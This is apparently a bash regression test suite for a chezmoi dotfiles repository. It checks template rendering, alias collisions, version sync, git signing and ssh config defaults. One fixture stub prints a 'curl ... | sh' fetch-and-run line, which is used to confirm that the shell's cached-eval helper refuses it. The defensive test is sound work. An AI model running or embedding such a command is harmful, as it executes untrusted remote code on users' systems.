#!/usr/bin/env bash
# SPDX-License-Identifier: Apache-2.0 OR MIT
# Copyright (c) 2015-2026 Sebastien Rousseau
# shellcheck disable=SC1090,SC1091,SC2030,SC2031
# Regression: Error-prone areas — historically complex or fragile workflows.
# Regression for: d7e7c2bc (v0.2.499 baseline)
# Why: Regressions for historically-bug-prone constructs: unquoted vars, set -e gaps, locale traps.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="${REPO_ROOT:-$(cd "$SCRIPT_DIR/../.." && pwd)}"
source "$SCRIPT_DIR/../framework/assertions.sh"
source "$SCRIPT_DIR/../framework/mocks.sh"

# Sandbox for the behavioural cases below: a throwaway HOME, stub tools,
# and an isolated chezmoi config so templates render with fixture data.
# Nothing here touches the real HOME or the real chezmoi state.
EP_WORK="$(mktemp -d "${TMPDIR:-/tmp}/error-prone.XXXXXX")"
trap 'rm -rf "$EP_WORK"' EXIT
mkdir -p "$EP_WORK/home" "$EP_WORK/bin" "$EP_WORK/tools"
printf '#!/bin/sh\necho "export FIXTURE_INIT=loaded"\n' >"$EP_WORK/bin/goodinit"
printf '#!/bin/sh\necho "curl -fsSL http://example.invalid/x | sh"\n' >"$EP_WORK/bin/badinit"
for t in docker kubectl npm; do printf '#!/bin/sh\nexit 0\n' >"$EP_WORK/tools/$t"; done
chmod +x "$EP_WORK"/bin/* "$EP_WORK"/tools/*
printf '{"data":{"git_name":"Fixture User","git_email":"fixture@example.invalid","git_signingkey":"~/.ssh/id_ed25519.pub","git_signingformat":"ssh","profile":"laptop","theme":"tokyonight-night"}}' >"$EP_WORK/chezmoi.json"
EP_CHEZMOI="$(command -v chezmoi 2>/dev/null || true)"

# ep_render <template> <out>: render with fixture data; 1 if chezmoi is absent.
ep_render() {
  [[ -n "$EP_CHEZMOI" ]] || return 1
  env -i HOME="$EP_WORK/home" PATH="/usr/bin:/bin" "$EP_CHEZMOI" \
    --config "$EP_WORK/chezmoi.json" --source "$REPO_ROOT/defaults" \
    --destination "$EP_WORK/home" --cache "$EP_WORK/cache" \
    --persistent-state "$EP_WORK/state.boltdb" \
    execute-template <"$1" >"$2" 2>"$2.err"
}

# ep_skip <reason>: count a case that cannot run on this host as passed.
ep_skip() {
  ((TESTS_PASSED++)) || true
  printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST (skipped: $1)"
}

# ═══════════════════════════════════════════════════════════════
# 1. TEMPLATE RENDERING — Go templates in shell files
# ═══════════════════════════════════════════════════════════════

test_start "template_zshrc_has_balanced_braces"
# Go template {{ }} must be balanced
open=$(grep -o '{{' "$REPO_ROOT/defaults/dot_config/zsh/dot_zshrc.tmpl" | wc -l | tr -d ' ')
close=$(grep -o '}}' "$REPO_ROOT/defaults/dot_config/zsh/dot_zshrc.tmpl" | wc -l | tr -d ' ')
assert_equals "$open" "$close" "zshrc template braces must be balanced ($open open, $close close)"

test_start "template_gitconfig_has_balanced_braces"
open=$(grep -o '{{' "$REPO_ROOT/defaults/dot_gitconfig.tmpl" | wc -l | tr -d ' ')
close=$(grep -o '}}' "$REPO_ROOT/defaults/dot_gitconfig.tmpl" | wc -l | tr -d ' ')
assert_equals "$open" "$close" "gitconfig template braces must be balanced"

test_start "template_no_raw_template_syntax_in_non_tmpl"
# Non-.tmpl shell files must NOT contain {{ .chezmoi }} or {{ .dotfiles }} template syntax
# Excludes docker format strings ({{.Names}}) which use Go templates legitimately
violations=0
while IFS= read -r f; do
  if grep -qE '\{\{\s*\.(chezmoi|dotfiles|features|if|else|end|range)' "$f" 2>/dev/null; then
    violations=$((violations + 1))
  fi
done < <(find "$REPO_ROOT/defaults/.chezmoitemplates" -name "*.sh" ! -name "*.tmpl" 2>/dev/null)
assert_equals "0" "$violations" "non-.tmpl files must not contain chezmoi template directives"

# ═══════════════════════════════════════════════════════════════
# 2. ALIAS AGGREGATION — collision detection
# ═══════════════════════════════════════════════════════════════

test_start "alias_no_duplicate_names_in_ai"
# Extract alias names from AI aliases and check for duplicates
ai_aliases=$(grep -E '^\s*alias\s+\w+=' "$REPO_ROOT/defaults/.chezmoitemplates/aliases/ai/ai.aliases.sh" 2>/dev/null | sed 's/.*alias \([^=]*\)=.*/\1/' | sort)
dupes=$(echo "$ai_aliases" | uniq -d)
if [[ -z "$dupes" ]]; then
  ((TESTS_PASSED++))
  printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST: no duplicate AI alias names"
else
  ((TESTS_FAILED++))
  printf '%b\n' "  ${RED}✗${NC} $CURRENT_TEST: duplicate alias names found: $dupes"
fi

test_start "alias_no_duplicate_names_in_git"
git_aliases=$(grep -rhE '^\s*alias\s+\w+=' "$REPO_ROOT/defaults/.chezmoitemplates/aliases/git/" 2>/dev/null | sed 's/.*alias \([^=]*\)=.*/\1/' | sort)
dupes=$(echo "$git_aliases" | uniq -d)
if [[ -z "$dupes" ]]; then
  ((TESTS_PASSED++))
  printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST: no duplicate git alias names"
else
  ((TESTS_FAILED++))
  printf '%b\n' "  ${RED}✗${NC} $CURRENT_TEST: duplicate git alias names: $dupes"
fi

# ═══════════════════════════════════════════════════════════════
# 3. CACHED EVAL — cache invalidation correctness
# ═══════════════════════════════════════════════════════════════

# _cached_eval evals a tool's init output. It must eval and cache benign
# output under $XDG_CACHE_HOME, and refuse (rc 1, nothing cached, nothing
# evaluated) output that pipes a download into a shell. Exercised through
# the real bashrc (bash 5 and macOS /bin/bash 3.2) and the rendered zshrc.
ep_shells=(bash)
[[ -x /bin/bash ]] && ! [[ /bin/bash -ef "$(command -v bash)" ]] && ep_shells+=(/bin/bash)
for ep_sh in "${ep_shells[@]}"; do
  ep_ver="$("$ep_sh" -c 'echo "${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"')"
  rm -rf "$EP_WORK/home/.cache"
  ep_out="$(env -i HOME="$EP_WORK/home" XDG_CACHE_HOME="$EP_WORK/home/.cache" \
    PATH="$EP_WORK/bin:/usr/bin:/bin" TERM=dumb \
    "$ep_sh" --noprofile --rcfile "$REPO_ROOT/defaults/dot_bashrc" -i -c '
      _deferred_hydration
      _cached_eval goodinit goodinit; echo "good_rc=$? FIXTURE_INIT=${FIXTURE_INIT:-unset}"
      _cached_eval badinit badinit; echo "bad_rc=$?"' 2>&1)" || true
  test_start "cached_eval_bash_caches_benign_init (bash $ep_ver)"
  assert_contains "good_rc=0 FIXTURE_INIT=loaded" "$ep_out" "benign init is evaluated"
  test_start "cached_eval_bash_caches_benign_init_2 (bash $ep_ver)"
  assert_file_exists "$EP_WORK/home/.cache/bash/goodinit.bash" "and cached under XDG_CACHE_HOME/bash"
  test_start "cached_eval_bash_rejects_suspicious_init (bash $ep_ver)"
  assert_contains "bad_rc=1" "$ep_out" "a download piped into a shell is refused"
  test_start "cached_eval_bash_rejects_suspicious_init_2 (bash $ep_ver)"
  assert_contains "Suspicious output from badinit" "$ep_out" "and the refusal is reported"
  test_start "cached_eval_bash_rejects_suspicious_init_3 (bash $ep_ver)"
  assert_file_not_exists "$EP_WORK/home/.cache/bash/badinit.bash" "and nothing is cached"
done

test_start "cached_eval_zsh_rejects_suspicious_init"
if ! command -v zsh >/dev/null 2>&1; then
  ep_skip "zsh not installed"
elif ! ep_render "$REPO_ROOT/defaults/dot_config/zsh/dot_zshrc.tmpl" "$EP_WORK/zshrc"; then
  ep_skip "chezmoi not installed"
else
  mkdir -p "$EP_WORK/zdot"
  cp "$EP_WORK/zshrc" "$EP_WORK/zdot/.zshrc"
  rm -rf "$EP_WORK/home/.cache"
  ep_out="$(env -i HOME="$EP_WORK/home" ZDOTDIR="$EP_WORK/zdot" \
    XDG_CACHE_HOME="$EP_WORK/home/.cache" XDG_CONFIG_HOME="$EP_WORK/home/.config" \
    PATH="$EP_WORK/bin:/usr/bin:/bin" TERM=dumb zsh -i -c '
      _cached_eval goodinit goodinit; print "good_rc=$? FIXTURE_INIT=${FIXTURE_INIT:-unset}"
      _cached_eval badinit badinit; print "bad_rc=$?"' 2>&1)" || true
  assert_contains "good_rc=0 FIXTURE_INIT=loaded" "$ep_out" "zsh evaluates benign init"
  test_start "cached_eval_zsh_rejects_suspicious_init_4"
  assert_contains "bad_rc=1" "$ep_out" "zsh refuses a download piped into a shell"
  test_start "cached_eval_zsh_rejects_suspicious_init_5"
  assert_contains "Suspicious output from badinit" "$ep_out" "and reports it"
fi

test_start "cached_eval_fish_exists"
assert_file_exists "$REPO_ROOT/defaults/dot_config/fish/functions/_cached_eval.fish" "fish _cached_eval must exist"

# ═══════════════════════════════════════════════════════════════
# 4. VERSION SYNC — dotfiles_version consistency
# ═══════════════════════════════════════════════════════════════

test_start "version_in_chezmoidata"
version=$(grep -E '^dotfiles_version' "$REPO_ROOT/defaults/.chezmoidata.toml" | head -1 | sed 's/.*"\(.*\)".*/\1/')
if [[ -n "$version" ]]; then
  ((TESTS_PASSED++))
  printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST: version is $version"
else
  ((TESTS_FAILED++))
  printf '%b\n' "  ${RED}✗${NC} $CURRENT_TEST: version not found in .chezmoidata.toml"
fi

test_start "version_in_dot_cli"
ep_out="$(env -i HOME="$EP_WORK/home" PATH="/usr/bin:/bin" TERM=dumb NO_COLOR=1 \
  DOTFILES_NO_TUI=1 bash "$REPO_ROOT/bin/dot" version 2>&1)" || true
assert_contains ".dotfiles $version" "$ep_out" "dot version reports the manifest's version ($version)"

# ═══════════════════════════════════════════════════════════════
# 5. CROSS-PLATFORM PATH HANDLING
# ═══════════════════════════════════════════════════════════════

test_start "paths_no_hardcoded_user_home"
# Shell files should use $HOME, not /home/<username> or /Users/<username>
# Excludes system paths: /home/linuxbrew (Homebrew on Linux)
hardcoded=0
while IFS= read -r f; do
  if grep -vE '^\s*#' "$f" | grep -qE '/home/[a-z]|/Users/[a-z]' 2>/dev/null; then
    # Allow known system paths
    if grep -vE '^\s*#' "$f" | grep -vE '/home/linuxbrew' | grep -qE '/home/[a-z]|/Users/[a-z]' 2>/dev/null; then
      hardcoded=$((hardcoded + 1))
    fi
  fi
done < <(find "$REPO_ROOT/defaults/.chezmoitemplates" -name "*.sh" 2>/dev/null)
assert_equals "0" "$hardcoded" "no hardcoded user home paths in templates"

# (XDG compliance of the bash cache is pinned by the cached_eval cases:
# the cache must land under the sandbox's XDG_CACHE_HOME.)

# ═══════════════════════════════════════════════════════════════
# 6. FEATURE FLAG GATING
# ═══════════════════════════════════════════════════════════════

test_start "feature_flags_all_boolean"
# Feature flags must be boolean (true/false), not strings
non_bool=0
while IFS= read -r line; do
  if echo "$line" | grep -qE '^\s*\w+\s*=\s*"'; then
    non_bool=$((non_bool + 1))
  fi
done < <(sed -n '/\[features\]/,/^\[/p' "$REPO_ROOT/defaults/.chezmoidata.toml" | grep -v '^\[' | grep -v '^$' | grep -v '^#')
assert_equals "0" "$non_bool" "all feature flags should be boolean (true/false)"

# ═══════════════════════════════════════════════════════════════
# 7. GPG/SSH SIGNING — configuration integrity
# ═══════════════════════════════════════════════════════════════

# The gitconfig template is rendered with fixture data and queried with
# git itself, so these pin what git will actually do.
EP_GITCONFIG=""
if ep_render "$REPO_ROOT/defaults/dot_gitconfig.tmpl" "$EP_WORK/gitconfig"; then
  EP_GITCONFIG="$EP_WORK/gitconfig"
fi
ep_git() { git config -f "$EP_GITCONFIG" --get "$1" 2>/dev/null || true; }

test_start "gitconfig_commit_signing"
if [[ -z "$EP_GITCONFIG" ]]; then ep_skip "chezmoi not installed"; else
  assert_equals "true" "$(ep_git commit.gpgsign)" "git signs every commit"
  test_start "gitconfig_commit_signing_2"
  assert_equals "ssh" "$(ep_git gpg.format)" "with the configured SSH signing format"
fi

test_start "gitconfig_merge_verify"
if [[ -z "$EP_GITCONFIG" ]]; then ep_skip "chezmoi not installed"; else
  assert_equals "true" "$(ep_git merge.verifySignatures)" "merges verify signatures"
fi

test_start "gpg_cache_ttl_reasonable"
ttl=$(grep -E 'default-cache-ttl' "$REPO_ROOT/defaults/dot_config/gnupg/gpg-agent.conf" | head -1 | awk '{print $2}')
if [[ -n "$ttl" && "$ttl" -le 7200 ]]; then
  ((TESTS_PASSED++)) || true
  printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST: GPG cache TTL is ${ttl}s (<= 7200s)"
else
  ((TESTS_FAILED++)) || true
  printf '%b\n' "  ${RED}✗${NC} $CURRENT_TEST: GPG cache TTL ${ttl}s too high (max 7200s)"
fi

# ═══════════════════════════════════════════════════════════════
# 8. TEMPLATE BALANCE CHECKS — more .tmpl files
# ═══════════════════════════════════════════════════════════════

test_start "template_ssh_config_has_balanced_braces"
open=$(grep -o '{{' "$REPO_ROOT/defaults/private_dot_ssh/config.tmpl" | wc -l | tr -d ' ')
close=$(grep -o '}}' "$REPO_ROOT/defaults/private_dot_ssh/config.tmpl" | wc -l | tr -d ' ')
assert_equals "$open" "$close" "ssh config template braces must be balanced ($open open, $close close)"

test_start "template_fish_init_has_balanced_braces"
open=$(grep -o '{{' "$REPO_ROOT/defaults/dot_config/fish/conf.d/init.fish.tmpl" | wc -l | tr -d ' ')
close=$(grep -o '}}' "$REPO_ROOT/defaults/dot_config/fish/conf.d/init.fish.tmpl" | wc -l | tr -d ' ')
assert_equals "$open" "$close" "fish init template braces must be balanced ($open open, $close close)"

# (The bashrc is sourced interactively by the cached_eval cases above,
# under bash 5 and 3.2; a syntax error fails them.)

test_start "template_options_zsh_has_balanced_braces"
# Shell sources like this template contain nested `${VAR:-${INNER}}`
# which legitimately produces `}}` without being Go template syntax.
# Counting both delimiters confuses the two. Validate the template by
# asking chezmoi to render it — if it parses, the braces are balanced.
options_tmpl="$REPO_ROOT/defaults/dot_config/zsh/rc.d/30-options.zsh.tmpl"
if command -v chezmoi >/dev/null 2>&1; then
  if chezmoi execute-template <"$options_tmpl" >/dev/null 2>&1; then
    ((TESTS_PASSED++)) || true
    printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST: chezmoi parses the template"
  else
    ((TESTS_FAILED++)) || true
    printf '%b\n' "  ${RED}✗${NC} $CURRENT_TEST: chezmoi failed to parse the template"
  fi
else
  ((TESTS_PASSED++)) || true
  printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST: skipped (chezmoi not installed)"
fi

test_start "template_aliases_aggregator_has_balanced_braces"
open=$(grep -o '{{' "$REPO_ROOT/defaults/dot_config/shell/90-ux-aliases.sh.tmpl" | wc -l | tr -d ' ')
close=$(grep -o '}}' "$REPO_ROOT/defaults/dot_config/shell/90-ux-aliases.sh.tmpl" | wc -l | tr -d ' ')
assert_equals "$open" "$close" "alias aggregator template braces must be balanced ($open open, $close close)"

test_start "template_starship_has_balanced_braces"
open=$(grep -o '{{' "$REPO_ROOT/defaults/dot_config/starship.toml.tmpl" | wc -l | tr -d ' ')
close=$(grep -o '}}' "$REPO_ROOT/defaults/dot_config/starship.toml.tmpl" | wc -l | tr -d ' ')
assert_equals "$open" "$close" "starship template braces must be balanced ($open open, $close close)"

test_start "template_kitty_has_balanced_braces"
open=$(grep -o '{{' "$REPO_ROOT/defaults/dot_config/kitty/kitty.conf.tmpl" | wc -l | tr -d ' ')
close=$(grep -o '}}' "$REPO_ROOT/defaults/dot_config/kitty/kitty.conf.tmpl" | wc -l | tr -d ' ')
assert_equals "$open" "$close" "kitty template braces must be balanced ($open open, $close close)"

# ═══════════════════════════════════════════════════════════════
# 9. ALIAS COLLISION CHECKS — more domains
# ═══════════════════════════════════════════════════════════════

test_start "alias_no_duplicate_names_in_docker"
docker_aliases=$(grep -rhE '^\s*alias\s+\w+=' "$REPO_ROOT/defaults/.chezmoitemplates/aliases/docker/" 2>/dev/null | sed 's/.*alias \([^=]*\)=.*/\1/' | sort)
dupes=$(echo "$docker_aliases" | uniq -d)
if [[ -z "$dupes" ]]; then
  ((TESTS_PASSED++)) || true
  printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST: no duplicate docker alias names"
else
  ((TESTS_FAILED++)) || true
  printf '%b\n' "  ${RED}✗${NC} $CURRENT_TEST: duplicate docker alias names: $dupes"
fi

test_start "alias_no_duplicate_names_in_kubernetes"
k8s_aliases=$(grep -rhE '^\s*alias\s+\w+=' "$REPO_ROOT/defaults/.chezmoitemplates/aliases/kubernetes/" 2>/dev/null | sed 's/.*alias \([^=]*\)=.*/\1/' | sort)
dupes=$(echo "$k8s_aliases" | uniq -d)
if [[ -z "$dupes" ]]; then
  ((TESTS_PASSED++)) || true
  printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST: no duplicate kubernetes alias names"
else
  ((TESTS_FAILED++)) || true
  printf '%b\n' "  ${RED}✗${NC} $CURRENT_TEST: duplicate kubernetes alias names: $dupes"
fi

test_start "alias_no_duplicate_names_in_cd"
cd_aliases=$(grep -rhE '^\s*alias\s+\w+=' "$REPO_ROOT/defaults/.chezmoitemplates/aliases/cd/" 2>/dev/null | sed 's/.*alias \([^=]*\)=.*/\1/' | sort)
dupes=$(echo "$cd_aliases" | uniq -d)
if [[ -z "$dupes" ]]; then
  ((TESTS_PASSED++)) || true
  printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST: no duplicate cd alias names"
else
  ((TESTS_FAILED++)) || true
  printf '%b\n' "  ${RED}✗${NC} $CURRENT_TEST: duplicate cd alias names: $dupes"
fi

test_start "alias_no_duplicate_names_in_default"
# Conditional aliases (if/elif) may define the same name for different platforms — exclude those
default_aliases=$(grep -rhE '^\s*alias\s+\w+=' "$REPO_ROOT/defaults/.chezmoitemplates/aliases/default/" 2>/dev/null | sed 's/.*alias \([^=]*\)=.*/\1/' | sort)
dupes=$(echo "$default_aliases" | uniq -c | awk '$1 > 2 {print $2}' || true)
if [[ -z "$dupes" ]]; then
  ((TESTS_PASSED++)) || true
  printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST: no duplicate default alias names"
else
  ((TESTS_FAILED++)) || true
  printf '%b\n' "  ${RED}✗${NC} $CURRENT_TEST: duplicate default alias names: $dupes"
fi

# ═══════════════════════════════════════════════════════════════
# 10. VERSION CONSISTENCY
# ═══════════════════════════════════════════════════════════════

test_start "version_consistent_chezmoidata_vs_package_json"
chezmoi_ver=$(grep -E '^dotfiles_version' "$REPO_ROOT/defaults/.chezmoidata.toml" | head -1 | sed 's/.*"\(.*\)".*/\1/')
pkg_ver=$(grep -E '"version"' "$REPO_ROOT/package.json" | head -1 | sed 's/.*"\([0-9][0-9.]*\)".*/\1/')
assert_equals "$chezmoi_ver" "$pkg_ver" "version in .chezmoidata.toml ($chezmoi_ver) must match package.json ($pkg_ver)"

# ═══════════════════════════════════════════════════════════════
# 11. NO DEPRECATED VIM.LOOP IN NEOVIM CONFIGS
# ═══════════════════════════════════════════════════════════════

test_start "nvim_no_deprecated_vim_loop"
vim_loop_count=0
while IFS= read -r f; do
  if grep -qE 'vim\.loop' "$f" 2>/dev/null; then
    vim_loop_count=$((vim_loop_count + 1))
  fi
done < <(find "$REPO_ROOT/defaults/dot_config/nvim" -name "*.lua" 2>/dev/null)
assert_equals "0" "$vim_loop_count" "nvim configs must not use deprecated vim.loop (use vim.uv instead)"

# ═══════════════════════════════════════════════════════════════
# 12. FUNCTION FILES SYNTAX — all must pass bash -n
# ═══════════════════════════════════════════════════════════════

test_start "functions_api_files_syntax"
bad_funcs=""
for f in "$REPO_ROOT"/.chezmoitemplates/functions/api/*.sh; do
  [[ -f "$f" ]] || continue
  bash -n "$f" 2>/dev/null || bad_funcs="$bad_funcs $(basename "$f")"
done
if [[ -z "$bad_funcs" ]]; then
  ((TESTS_PASSED++)) || true
  printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST: all functions/api/*.sh files pass bash -n"
else
  ((TESTS_FAILED++)) || true
  printf '%b\n' "  ${RED}✗${NC} $CURRENT_TEST: syntax errors in:$bad_funcs"
fi

test_start "functions_files_files_syntax"
bad_funcs=""
for f in "$REPO_ROOT"/.chezmoitemplates/functions/files/*.sh; do
  [[ -f "$f" ]] || continue
  bash -n "$f" 2>/dev/null || bad_funcs="$bad_funcs $(basename "$f")"
done
if [[ -z "$bad_funcs" ]]; then
  ((TESTS_PASSED++)) || true
  printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST: all functions/files/*.sh files pass bash -n"
else
  ((TESTS_FAILED++)) || true
  printf '%b\n' "  ${RED}✗${NC} $CURRENT_TEST: syntax errors in:$bad_funcs"
fi

test_start "functions_security_files_syntax"
bad_funcs=""
for f in "$REPO_ROOT"/.chezmoitemplates/functions/security/*.sh; do
  [[ -f "$f" ]] || continue
  bash -n "$f" 2>/dev/null || bad_funcs="$bad_funcs $(basename "$f")"
done
if [[ -z "$bad_funcs" ]]; then
  ((TESTS_PASSED++)) || true
  printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST: all functions/security/*.sh files pass bash -n"
else
  ((TESTS_FAILED++)) || true
  printf '%b\n' "  ${RED}✗${NC} $CURRENT_TEST: syntax errors in:$bad_funcs"
fi

test_start "functions_system_files_syntax"
bad_funcs=""
for f in "$REPO_ROOT"/.chezmoitemplates/functions/system/*.sh; do
  [[ -f "$f" ]] || continue
  bash -n "$f" 2>/dev/null || bad_funcs="$bad_funcs $(basename "$f")"
done
if [[ -z "$bad_funcs" ]]; then
  ((TESTS_PASSED++)) || true
  printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST: all functions/system/*.sh files pass bash -n"
else
  ((TESTS_FAILED++)) || true
  printf '%b\n' "  ${RED}✗${NC} $CURRENT_TEST: syntax errors in:$bad_funcs"
fi

test_start "functions_text_files_syntax"
bad_funcs=""
for f in "$REPO_ROOT"/.chezmoitemplates/functions/text/*.sh; do
  [[ -f "$f" ]] || continue
  bash -n "$f" 2>/dev/null || bad_funcs="$bad_funcs $(basename "$f")"
done
if [[ -z "$bad_funcs" ]]; then
  ((TESTS_PASSED++)) || true
  printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST: all functions/text/*.sh files pass bash -n"
else
  ((TESTS_FAILED++)) || true
  printf '%b\n' "  ${RED}✗${NC} $CURRENT_TEST: syntax errors in:$bad_funcs"
fi

# ═══════════════════════════════════════════════════════════════
# 13. ALIAS FILES SYNTAX — all must pass bash -n
# ═══════════════════════════════════════════════════════════════

# Each alias file is sourced in a clean bash (and /bin/bash 3.2) with its
# tool stubbed on PATH. It must load without error and define aliases or
# functions; a syntax error or a broken guard fails the case.
ep_source_aliases() { # <shell> <file>
  env -i HOME="$EP_WORK/home" PATH="$EP_WORK/tools:/usr/bin:/bin" TERM=dumb "$1" -c '
    source "$1" >/dev/null 2>&1; rc=$?
    printf "rc=%s defined=%s" "$rc" "$(( $(alias | wc -l) + $(declare -F | wc -l) ))"' _ "$2"
}
for ep_alias in docker/docker kubernetes/kubernetes git/git cd/cd-core modern/modern security/security; do
  for ep_sh in "${ep_shells[@]}"; do
    test_start "aliases_$(basename "$ep_alias")_loads ($("$ep_sh" -c 'echo "bash ${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"'))"
    ep_out="$(ep_source_aliases "$ep_sh" "$REPO_ROOT/defaults/.chezmoitemplates/aliases/$ep_alias.aliases.sh")"
    assert_contains "rc=0" "$ep_out" "sources cleanly"
    test_start "aliases_$(basename "$ep_alias")_loads_2 ($("$ep_sh" -c 'echo "bash ${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"'))"
    assert_false '[[ "$ep_out" == *"defined=0" ]]' "defines aliases or functions ($ep_out)"
  done
done

# ═══════════════════════════════════════════════════════════════
# 14. FEATURE FLAGS USED IN TEMPLATES EXIST IN .CHEZMOIDATA.TOML
# ═══════════════════════════════════════════════════════════════

test_start "feature_flags_referenced_exist"
# Extract feature flags used in templates ({{ if .features.X }})
missing_flags=""
while IFS= read -r flag; do
  if ! grep -qE "^\s*${flag}\s*=" "$REPO_ROOT/defaults/.chezmoidata.toml" 2>/dev/null; then
    missing_flags="$missing_flags $flag"
  fi
done < <(grep -rohE '\.\s*features\.([a-zA-Z_]+)' "$REPO_ROOT/defaults/dot_config/zsh/dot_zshrc.tmpl" 2>/dev/null | sed 's/.*features\.\([a-zA-Z_]*\)/\1/' | sort -u)
if [[ -z "$missing_flags" ]]; then
  ((TESTS_PASSED++)) || true
  printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST: all referenced feature flags exist in .chezmoidata.toml"
else
  ((TESTS_FAILED++)) || true
  printf '%b\n' "  ${RED}✗${NC} $CURRENT_TEST: missing feature flags:$missing_flags"
fi

# ═══════════════════════════════════════════════════════════════
# 15. NO HARDCODED EMAIL IN NON-TEMPLATE SHELL SCRIPTS
# ═══════════════════════════════════════════════════════════════

test_start "no_hardcoded_email_in_shell_scripts"
email_count=0
while IFS= read -r f; do
  # Exclude security files (keygen, ssh-config) which use emails as examples
  [[ "$f" == *security* ]] && continue
  if grep -vE '^\s*#' "$f" | grep -qE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' 2>/dev/null; then
    email_count=$((email_count + 1))
  fi
done < <(find "$REPO_ROOT/defaults/.chezmoitemplates" -name "*.sh" ! -name "*.tmpl" 2>/dev/null)
assert_equals "0" "$email_count" "non-template shell scripts must not contain hardcoded email addresses"

# ═══════════════════════════════════════════════════════════════
# 16. SSH CONFIG TEMPLATE REQUIRED SECTIONS
# ═══════════════════════════════════════════════════════════════

# Rendered with fixture data and resolved by ssh itself for an arbitrary
# host, so the Host * defaults are what ssh would really apply.
test_start "ssh_config_has_host_wildcard"
if ! command -v ssh >/dev/null 2>&1; then
  ep_skip "ssh not installed"
elif ! ep_render "$REPO_ROOT/defaults/private_dot_ssh/config.tmpl" "$EP_WORK/ssh_config"; then
  ep_skip "chezmoi not installed"
else
  EP_SSH="$(ssh -G -F "$EP_WORK/ssh_config" any-host.example.invalid 2>/dev/null || true)"
  assert_contains "serveraliveinterval 60" "$EP_SSH" "Host * defaults apply to any host"
  test_start "ssh_config_has_kex_algorithms"
  assert_true 'grep -qE "^kexalgorithms curve25519-sha256" <<<"$EP_SSH"' "ssh negotiates curve25519 key exchange first"
  test_start "ssh_config_has_kex_algorithms_2"
  assert_false 'grep -qiE "^kexalgorithms.*(diffie-hellman-group1|group14-sha1)" <<<"$EP_SSH"' "no legacy key exchange offered"
fi

# ═══════════════════════════════════════════════════════════════
# 17. GIT CONFIG TEMPLATE REQUIRED SECTIONS
# ═══════════════════════════════════════════════════════════════

test_start "gitconfig_has_user_section"
if [[ -z "$EP_GITCONFIG" ]]; then ep_skip "chezmoi not installed"; else
  assert_equals "Fixture User" "$(ep_git user.name)" "user.name comes from the machine data"
  test_start "gitconfig_has_user_section_2"
  assert_equals "fixture@example.invalid" "$(ep_git user.email)" "user.email comes from the machine data"
fi

test_start "gitconfig_has_core_section"
if [[ -z "$EP_GITCONFIG" ]]; then ep_skip "chezmoi not installed"; else
  # Compare physical paths: TMPDIR may end in "/" and /var links to /private/var.
  ep_excl="$(ep_git core.excludesfile)"
  assert_equals "$(cd "$EP_WORK/home" && pwd -P)/.config/git/ignore" \
    "$(cd "$(dirname "$(dirname "$(dirname "$ep_excl")")")" 2>/dev/null && pwd -P)/.config/git/ignore" \
    "global ignore file resolves under the user's XDG config"
fi

test_start "gitconfig_has_push_section"
if [[ -z "$EP_GITCONFIG" ]]; then ep_skip "chezmoi not installed"; else
  assert_equals "true" "$(ep_git push.autoSetupRemote)" "new branches push without an explicit upstream"
fi

test_start "gitconfig_has_merge_section"
if [[ -z "$EP_GITCONFIG" ]]; then ep_skip "chezmoi not installed"; else
  assert_equals "true" "$(ep_git merge.verifySignatures)" "the [merge] section is live"
fi

# ═══════════════════════════════════════════════════════════════
# 18. ADDITIONAL ALIAS AND FUNCTION SYNTAX CHECKS
# ═══════════════════════════════════════════════════════════════

for ep_alias in npm/npm python/python; do
  for ep_sh in "${ep_shells[@]}"; do
    test_start "aliases_$(basename "$ep_alias")_loads ($("$ep_sh" -c 'echo "bash ${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"'))"
    ep_out="$(ep_source_aliases "$ep_sh" "$REPO_ROOT/defaults/.chezmoitemplates/aliases/$ep_alias.aliases.sh")"
    assert_contains "rc=0" "$ep_out" "sources cleanly"
    test_start "aliases_$(basename "$ep_alias")_loads_2 ($("$ep_sh" -c 'echo "bash ${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"'))"
    assert_false '[[ "$ep_out" == *"defined=0" ]]' "defines aliases or functions ($ep_out)"
  done
done

test_start "functions_nav_files_syntax"
bad_funcs=""
for f in "$REPO_ROOT"/.chezmoitemplates/functions/nav/*.sh; do
  [[ -f "$f" ]] || continue
  bash -n "$f" 2>/dev/null || bad_funcs="$bad_funcs $(basename "$f")"
done
if [[ -z "$bad_funcs" ]]; then
  ((TESTS_PASSED++)) || true
  printf '%b\n' "  ${GREEN}✓${NC} $CURRENT_TEST: all functions/nav/*.sh files pass bash -n"
else
  ((TESTS_FAILED++)) || true
  printf '%b\n' "  ${RED}✗${NC} $CURRENT_TEST: syntax errors in:$bad_funcs"
fi

echo ""
echo "RESULTS:$TESTS_RUN:$TESTS_PASSED:$TESTS_FAILED"
